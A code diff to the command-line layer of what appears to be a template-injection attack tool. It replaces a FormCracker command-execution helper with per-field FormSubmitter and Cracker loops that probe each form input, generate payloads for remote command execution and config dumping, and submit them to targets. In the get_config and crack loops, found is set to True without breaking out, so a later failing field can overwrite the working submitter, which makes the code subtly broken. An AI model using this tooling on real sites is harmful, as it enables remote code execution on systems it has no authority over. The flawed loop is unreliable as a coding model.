@@ -4,16 +4,15 @@
 
 import logging
 from urllib.parse import urlparse
-from typing import Callable, List, Dict, Union
+from typing import Callable, List, Dict
 from functools import partial
 
 import click
 
 
 from .form import get_form
-from .form_cracker import FormCracker
 from .cracker import Cracker
-from .submitter import Submitter, PathSubmitter
+from .submitter import Submitter, PathSubmitter, FormSubmitter
 from .full_payload_gen import FullPayloadGen
 from .scan_url import yield_form
 from .requester import Requester
@@ -75,42 +74,6 @@ def cmd_exec_submitter(
     result = submitter.submit(payload)
     assert result is not None
     return result.text
-
-
-def cmd_exec(
-    cmd: str,
-    cracker: FormCracker,
-    field: Union[str, None],
-    full_payload_gen: FullPayloadGen,
-):
-    """在目标上执行命令并返回回显
-
-    Args:
-        cmd (str): 命令
-        cracker (FormCracker): 目标表格对应的FormCracker
-        field (str): 提交到的目标项
-        full_payload_gen (FullPayloadGen): payload生成器
-
-    Returns:
-        str: 回显
-    """
-    payload, will_print = full_payload_gen.generate(OS_POPEN_READ, cmd)
-    if payload is None:
-        logger.warning("%s generating payload.", colored("red", "Failed"))
-        return ""
-    logger.info("Submit payload %s", colored("blue", payload))
-    if not will_print:
-        payload_wont_print = (
-            "Payload generator says that this "
-            + "payload %s command execution result."
-        )
-        logger.warning(payload_wont_print, colored("red", "won't print"))
-    if isinstance(cracker, FormCracker):
-        resp = cracker.submit({field: payload})
-    else:
-        resp = cracker.submit(payload)
-    assert resp is not None
-    return resp.text
 
 
 def interact(cmd_exec_func: Callable):
@@ -199,19 +162,42 @@ def get_config(
             headers_list=list(header), cookies=cookies
         ),
     )
-    cracker = FormCracker(
-        url=url, form=form, requester=requester, detect_mode=detect_mode
-    )
-    result = cracker.crack()
-    if result is None:
+    found, submitter, full_payload_gen = False, None, None
+    for input_field in form["inputs"]:
+        submitter = FormSubmitter(url, form, input_field, requester)
+        cracker = Cracker(submitter, detect_mode=detect_mode)
+        if not cracker.has_respond():
+            logger.info(
+                "Test input field %s failed, continue...", input_field
+            )
+            continue
+        full_payload_gen = cracker.crack()
+        if not full_payload_gen:
+            logger.info(
+                "Test input field %s failed, continue...", input_field
+            )
+            continue
+        found = True
+    if not found:
         logger.warning("Test form failed...")
         return
-    full_payload_gen, field = result
-    payload = full_payload_gen.generate(CONFIG)
-    resp = cracker.submit({field: payload})
+    assert submitter is not None and full_payload_gen is not None
+
+    payload, will_print = full_payload_gen.generate(CONFIG)
+    if not payload:
+        logger.error(
+            "The generator %s generating payload", colored("red", "failed")
+        )
+        return
+    if not will_print:
+        logger.error(
+            "The generated payload %s respond config.",
+            colored("red", "won't"),
+        )
+        return
+    resp = submitter.submit(payload)
 
     print(resp.text if resp is not None else None)
-    logger.warning("Bye!")
 
 
 @main.command()
@@ -262,18 +248,29 @@ def crack(
             headers_list=list(header), cookies=cookies
         ),
     )
-    cracker = FormCracker(
-        url=url, form=form, requester=requester, detect_mode=detect_mode
-    )
-    result = cracker.crack()
-    if result is None:
+    found, submitter, full_payload_gen = False, None, None
+    for input_field in form["inputs"]:
+        submitter = FormSubmitter(url, form, input_field, requester)
+        cracker = Cracker(submitter, detect_mode=detect_mode)
+        if not cracker.has_respond():
+            logger.info(
+                "Test input field %s failed, continue...", input_field
+            )
+            continue
+        full_payload_gen = cracker.crack()
+        if not full_payload_gen:
+            logger.info(
+                "Test input field %s failed, continue...", input_field
+            )
+            continue
+        found = True
+    if not found:
         logger.warning("Test form failed...")
         return
-    full_payload_gen, field = result
+    assert submitter is not None and full_payload_gen is not None
     cmd_exec_func = partial(
-        cmd_exec,
-        cracker=cracker,
-        field=field,
+        cmd_exec_submitter,
+        submitter=submitter,
         full_payload_gen=full_payload_gen,
     )
     if exec_cmd == "":
@@ -360,22 +357,23 @@ def scan(url, exec_cmd, interval, detect_mode, user_agent, header, cookies):
             headers_list=list(header), cookies=cookies
         ),
     )
-    for page_url, forms in yield_form(requester, url):
-        for form in forms:
-            cracker = FormCracker(
-                url=page_url,
-                form=form,
-                requester=requester,
-                detect_mode=detect_mode,
-            )
-            result = cracker.crack()
-            if result is None:
+    url_forms = (
+        (page_url, form)
+        for (page_url, forms) in yield_form(requester, url)
+        for form in forms
+    )
+    for page_url, form in url_forms:
+        for input_field in form["inputs"]:
+            submitter = FormSubmitter(page_url, form, input_field, requester)
+            cracker = Cracker(submitter, detect_mode=detect_mode)
+            if not cracker.has_respond():
                 continue
-            full_payload_gen, field = result
+            full_payload_gen = cracker.crack()
+            if full_payload_gen is None:
+                continue
             cmd_exec_func = partial(
-                cmd_exec,
-                cracker=cracker,
-                field=field,
+                cmd_exec_submitter,
+                submitter=submitter,
                 full_payload_gen=full_payload_gen,
             )
             if exec_cmd == "":
